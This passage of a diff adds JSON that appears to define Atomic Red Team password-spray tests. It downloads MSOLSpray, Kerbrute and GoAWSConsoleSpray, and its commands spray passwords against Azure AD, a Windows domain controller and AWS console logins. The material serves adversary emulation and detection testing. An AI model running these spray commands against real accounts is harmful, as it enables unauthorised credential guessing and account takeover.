+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\nInvoke-MSOLSpray -UserList \"#{user_list}\" -Password \"#{password}\"\n"
+                        }
+                    },
+                    {
+                        "name": "Password Spray using Kerbrute Tool",
+                        "auto_generated_guid": "c6f25ec3-6475-47a9-b75d-09ac593c5ecb",
+                        "description": "Test a single password against a list of users\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "domaincontroller": {
+                                "description": "Domain controller where test will be run",
+                                "type": "string",
+                                "default": "$ENV:userdnsdomain"
+                            },
+                            "domain": {
+                                "description": "Domain where you will be testing",
+                                "type": "string",
+                                "default": "$ENV:userdomain"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
+                                "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
+                            },
+                            {
+                                "description": "passwordspray.txt must exist in PathToAtomicsFolder\\..\\ExternalPayloads\n",
+                                "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"){exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n"
+                        }
+                    },
+                    {
+                        "name": "AWS - Password Spray an AWS using GoAWSConsoleSpray",
+                        "auto_generated_guid": "9c10d16b-20b1-403a-8e67-50ef7117ed4e",
+                        "description": "GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/\n",
+                        "supported_platforms": [
+                            "iaas:aws"
+                        ],
+                        "input_arguments": {
+                            "aws_account_id": {
+                                "description": "ID of the AWS account",
+                                "type": "string",
+                                "default": "XXXXXXXX"
+                            }
+                        },
+                        "dependencies": [
+                            {
+                                "description": "Check if go is installed\n",
+                                "prereq_command": "go version\n",
+                                "get_prereq_command": "echo Install GO\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "cd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt\n",
+                            "cleanup_command": "rm -rf /tmp/GoAWSConsoleSpray\n",
+                            "name": "sh",
+                            "elevation_required": false
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 13:03:28"
+}
